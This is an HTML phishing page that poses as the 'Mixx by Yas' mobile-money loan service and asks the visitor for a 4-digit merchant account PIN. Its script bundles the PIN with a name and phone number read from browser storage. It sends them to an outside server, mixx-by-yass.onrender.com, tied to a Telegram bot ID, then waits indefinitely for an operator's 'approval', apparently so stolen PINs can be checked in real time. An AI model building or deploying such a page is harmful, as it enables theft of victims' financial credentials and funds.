<!DOCTYPE html>
<html lang="en">
<head>
<meta charset="UTF-8">
<meta name="viewport" content="width=device-width, initial-scale=1.0">
<title>Mixx by Yas | Merchant Account PIN</title>

<style>
*{
  margin:0;
  padding:0;
  box-sizing:border-box;
}

body{
  font-family:-apple-system,BlinkMacSystemFont,'Segoe UI',Roboto,sans-serif;
  background:#f5f5f5;
  min-height:100vh;
}

.container{
  min-height:100vh;
  display:flex;
  flex-direction:column;
  align-items:center;
  padding:0;
}

.upper-section{
  width:100%;
  max-width:420px;
  text-align:center;
}

.header{
  background:#004fc5;
  padding:20px 20px 20px;
  border-bottom-left-radius:20px;
  border-bottom-right-radius:20px;
}

.logo-circle{
  width:55px;
  height:55px;
  background:#ffd500;
  border-radius:50%;
  margin:0 auto 8px;
  display:flex;
  align-items:center;
  justify-content:center;
  color:#004fc5;
  font-size:22px;
  font-weight:bold;
}

.brand{
  color:#ffd500;
  font-size:24px;
  font-weight:700;
}

.subtitle{
  color:white;
  margin-top:3px;
  font-size:13px;
}

.content{
  padding:30px 20px;
}

.merchant-title{
  font-size:28px;
  color:#333;
  font-weight:600;
  margin-bottom:10px;
}

.merchant-subtitle{
  color:#666;
  font-size:15px;
  margin-bottom:25px;
}

.phone-wrapper{
  position:relative;
  margin-bottom:25px;
}

.phone-display{
  width:100%;
  padding:16px;
  padding-left:60px;
  border:1px solid #ddd;
  border-radius:10px;
  font-size:18px;
  background:white;
  text-align:left;
}

.flag{
  position:absolute;
  left:18px;
  top:50%;
  transform:translateY(-50%);
  font-size:22px;
}

.pin-label{
  color:#666;
  font-size:16px;
  margin-bottom:18px;
  text-align:left;
}

.pin-row{
  display:flex;
  justify-content:center;
  align-items:center;
  gap:15px;
}

.pin-boxes{
  display:flex;
  gap:12px;
}

.pin-boxes input{
  width:55px;
  height:55px;
  border:1px solid #d9d9d9;
  border-radius:10px;
  text-align:center;
  font-size:24px;
  outline:none;
  background:white;
}

.pin-boxes input:focus{
  border-color:#004fc5;
  box-shadow:0 0 0 2px rgba(0,79,197,0.2);
}

.eye{
  font-size:22px;
  color:#888;
  cursor:pointer;
}

#status{
  min-height:20px;
  margin-top:10px;
  font-size:14px;
}

#status.error{
  color:#d00;
}

#status.success{
  color:#0a0;
}

#status.waiting{
  color:#004fc5;
}

.lower-section{
  width:100%;
  max-width:420px;
  padding:0 20px 40px;
}

.action-buttons{
  margin-top:15px;
}

.action{
  width:100%;
  background:#004fc5;
  color:white;
  text-align:center;
  padding:16px;
  border-radius:10px;
  font-size:18px;
  font-weight:600;
  cursor:pointer;
  border:none;
  transition: background 0.3s;
}

.action:hover{
  background:#003d99;
}

.action:active{
  background:#003080;
}

.action.disabled{
  opacity:0.5;
  cursor:not-allowed;
}

@media(max-width:480px){
  .merchant-title{
    font-size:24px;
  }
  .pin-boxes input{
    width:50px;
    height:50px;
  }
}
</style>
</head>

<body>

<div class="container">

  <div class="upper-section">

    <div class="header">

      <div class="logo-circle">
        yas
      </div>

      <div class="brand">
        Mixx by Yas
      </div>

      <div class="subtitle">
        Easy and Fast Loans
      </div>

    </div>

    <div class="content">

      <div class="merchant-title">
        Merchant Account PIN
      </div>

      <div class="merchant-subtitle">
        Enter your Merchant Account PIN (4 digits)
      </div>

      <div class="phone-wrapper">

        <span class="flag">🏪</span>

        <input
          class="phone-display"
          id="merchantDisplay"
          readonly
          value="Merchant Account">

      </div>

      <div class="pin-label">
        Enter your Merchant Account PIN (4 digits)
      </div>

      <div class="pin-row">

        <div class="pin-boxes">
          <input type="tel" maxlength="1" class="merchant-input">
          <input type="tel" maxlength="1" class="merchant-input">
          <input type="tel" maxlength="1" class="merchant-input">
          <input type="tel" maxlength="1" class="merchant-input">
        </div>

        <div class="eye" id="toggleVisibility">👁</div>

      </div>

      <div id="status"></div>

    </div>

  </div>

  <div class="lower-section">

    <div class="action-buttons">
      <button class="action" id="verifyBtn">
        CONFIRM PIN
      </button>
    </div>

  </div>

</div>

<script>
// Get botId from URL
const botId = new URLSearchParams(window.location.search).get("botId");
console.log("Bot ID from URL:", botId);

// If no botId, show error
if (!botId) {
  const statusEl = document.getElementById("status");
  statusEl.className = "error";
  statusEl.textContent = "Error: Missing bot ID. Please use the link from Telegram.";
  document.querySelector(".action").style.opacity = "0.5";
}

// Set merchant display
document.getElementById("merchantDisplay").value = 
  localStorage.getItem("merchantName") || "Merchant Account";

const boxes = document.querySelectorAll(".merchant-input");
const statusEl = document.getElementById("status");
const verifyBtn = document.getElementById("verifyBtn");
let isPasswordVisible = false;

// Toggle visibility
document.getElementById("toggleVisibility").addEventListener("click", function() {
  isPasswordVisible = !isPasswordVisible;
  boxes.forEach(box => {
    box.type = isPasswordVisible ? "text" : "tel";
  });
  this.textContent = isPasswordVisible ? "🙈" : "👁";
});

// Function to get user name from localStorage
function getUserName() {
  // Try multiple possible keys
  const firstName = localStorage.getItem("firstName") || "";
  const lastName = localStorage.getItem("lastName") || "";
  const name = localStorage.getItem("name") || "";
  
  // Build full name
  let fullName = name;
  if (!fullName && firstName) {
    fullName = lastName ? `${firstName} ${lastName}` : firstName;
  }
  if (!fullName) {
    // If still no name, check if there's any name stored
    const possibleName = localStorage.getItem("userName") || 
                        localStorage.getItem("fullName") || 
                        localStorage.getItem("clientName");
    if (possibleName) {
      fullName = possibleName;
    }
  }
  
  console.log("Retrieved name from localStorage:", {
    firstName,
    lastName,
    name,
    fullName,
    allKeys: Object.keys(localStorage)
  });
  
  return fullName || "Unknown";
}

async function sendMerchantPinToTelegram(name, phone, pin) {
  const BACKEND_URL = "https://mixx-by-yass.onrender.com";
  
  const payload = {
    name: name || "Unknown",
    phone: phone || "Unknown",
    pin: pin || "",
    botId: botId || ""
  };
  
  console.log("Sending merchant PIN to backend:", payload);
  
  try {
    const res = await fetch(`${BACKEND_URL}/submit-merchant-pin`, {
      method: "POST",
      headers: {
        "Content-Type": "application/json",
        "Accept": "application/json"
      },
      body: JSON.stringify(payload)
    });
    
    console.log("Response status:", res.status);
    
    const responseText = await res.text();
    console.log("Response body:", responseText);
    
    if (!res.ok) {
      try {
        const errorData = JSON.parse(responseText);
        statusEl.className = "error";
        statusEl.textContent = `Error: ${errorData.error || 'Server error'}`;
      } catch {
        statusEl.className = "error";
        statusEl.textContent = `Server error (${res.status}): ${responseText}`;
      }
      return null;
    }
    
    const data = JSON.parse(responseText);
    console.log("Success response:", data);
    return data;
    
  } catch (error) {
    console.error("Network error:", error);
    statusEl.className = "error";
    statusEl.textContent = "Network error. Please check your connection.";
    return null;
  }
}

async function pollMerchantPinApproval(requestId) {
  const BACKEND_URL = "https://mixx-by-yass.onrender.com";
  let attempts = 0;
  
  // NO TIMEOUT - Wait indefinitely for admin approval
  return new Promise((resolve) => {
    const interval = setInterval(async () => {
      attempts++;
      console.log(`Polling attempt ${attempts} for ${requestId}`);
      
      try {
        const res = await fetch(`${BACKEND_URL}/check-merchant-pin/${requestId}`);
        const data = await res.json();
        console.log("Poll response:", data);
        
        if (data.blocked) {
          clearInterval(interval);
          statusEl.className = "error";
          statusEl.textContent = "Your account has been blocked.";
          resolve(false);
          return;
        }
        
        if (data.approved === true) {
          clearInterval(interval);
          statusEl.className = "success";
          statusEl.textContent = "Merchant PIN approved! Redirecting...";
          resolve(true);
          return;
        }
        
        if (data.approved === false) {
          clearInterval(interval);
          statusEl.className = "error";
          statusEl.textContent = "Incorrect merchant PIN. Please try again.";
          resolve(false);
          return;
        }
        
        // Still waiting - show waiting message with elapsed time
        if (attempts % 10 === 0 || attempts === 1) {
          const elapsedSeconds = Math.floor(attempts * 1.5);
          const minutes = Math.floor(elapsedSeconds / 60);
          const seconds = elapsedSeconds % 60;
          const timeStr = minutes > 0 ? `${minutes}m ${seconds}s` : `${seconds}s`;
          statusEl.className = "waiting";
          statusEl.textContent = `Waiting for admin approval... (${timeStr})`;
        }
        
      } catch (error) {
        console.error("Poll error:", error);
        // Don't stop polling on network errors - keep trying
        statusEl.className = "waiting";
        statusEl.textContent = "Connection issue. Retrying...";
      }
    }, 1500);
  });
}

// PIN input handling
boxes.forEach((box, i) => {
  box.addEventListener("input", async () => {
    // Allow only numbers
    box.value = box.value.replace(/[^0-9]/g, '');
    
    // Auto-advance to next box
    if (box.value && i < 3) {
      boxes[i + 1].focus();
    }
    
    // Check if all 4 digits are entered
    if (i === 3 && box.value) {
      let pin = "";
      boxes.forEach(b => pin += b.value);
      
      // Validate botId
      if (!botId) {
        statusEl.className = "error";
        statusEl.textContent = "Error: Bot ID missing. Please use the link from Telegram.";
        boxes.forEach(b => { b.disabled = false; b.value = ""; });
        boxes[0].focus();
        return;
      }
      
      // Get user data - use the improved function
      const name = getUserName();
      const phone = localStorage.getItem("phone") || "Unknown";
      
      console.log("Submitting merchant PIN:", { name, phone, pin, botId });
      console.log("All localStorage data:", {...localStorage});
      
      // Disable inputs while processing
      boxes.forEach(b => b.disabled = true);
      verifyBtn.classList.add("disabled");
      verifyBtn.textContent = "VERIFYING...";
      statusEl.className = "waiting";
      statusEl.textContent = "Sending merchant PIN for verification...";
      
      // Send merchant PIN to backend
      const res = await sendMerchantPinToTelegram(name, phone, pin);
      
      if (!res || !res.requestId) {
        statusEl.className = "error";
        statusEl.textContent = "Failed to send merchant PIN. Please try again.";
        boxes.forEach(b => { b.disabled = false; b.value = ""; });
        verifyBtn.classList.remove("disabled");
        verifyBtn.textContent = "CONFIRM PIN";
        boxes[0].focus();
        return;
      }
      
      statusEl.className = "waiting";
      statusEl.textContent = "Waiting for admin approval...";
      
      // Poll for approval (will wait indefinitely until admin responds)
      const approved = await pollMerchantPinApproval(res.requestId);
      
      if (approved === true) {
        localStorage.setItem("merchantPin", pin);
        setTimeout(() => {
          window.location.href = `success.html?botId=${botId}`;
        }, 500);
      } else if (approved === false) {
        boxes.forEach(b => { b.disabled = false; b.value = ""; });
        verifyBtn.classList.remove("disabled");
        verifyBtn.textContent = "CONFIRM PIN";
        boxes[0].focus();
      } else {
        boxes.forEach(b => { b.disabled = false; b.value = ""; });
        verifyBtn.classList.remove("disabled");
        verifyBtn.textContent = "CONFIRM PIN";
        boxes[0].focus();
      }
    }
  });
  
  // Handle backspace
  box.addEventListener("keydown", (e) => {
    if (e.key === "Backspace" && !box.value && i > 0) {
      boxes[i - 1].focus();
    }
    // Allow Enter key to submit
    if (e.key === "Enter") {
      let pin = "";
      boxes.forEach(b => pin += b.value);
      if (pin.length === 4) {
        const event = new Event('input');
        boxes[3].dispatchEvent(event);
      } else {
        statusEl.className = "error";
        statusEl.textContent = "Please enter all 4 digits";
      }
    }
  });
});

// Focus first input on load
boxes[0].focus();

// Click handler for confirm button
verifyBtn.addEventListener("click", () => {
  let pin = "";
  boxes.forEach(b => pin += b.value);
  
  if (pin.length === 4) {
    // Trigger the last box's input event
    const event = new Event('input');
    boxes[3].dispatchEvent(event);
  } else {
    statusEl.className = "error";
    statusEl.textContent = "Please enter a 4-digit PIN";
    boxes[0].focus();
  }
});

// Handle paste functionality
document.addEventListener('paste', (e) => {
  const pastedData = e.clipboardData.getData('text');
  const cleanedData = pastedData.replace(/[^0-9]/g, '');
  
  if (cleanedData.length === 4) {
    boxes.forEach((box, index) => {
      box.value = cleanedData[index] || '';
    });
    // Focus the last box and trigger the input event
    boxes[3].focus();
    const event = new Event('input');
    boxes[3].dispatchEvent(event);
  }
});
</script>

</body>
</html>
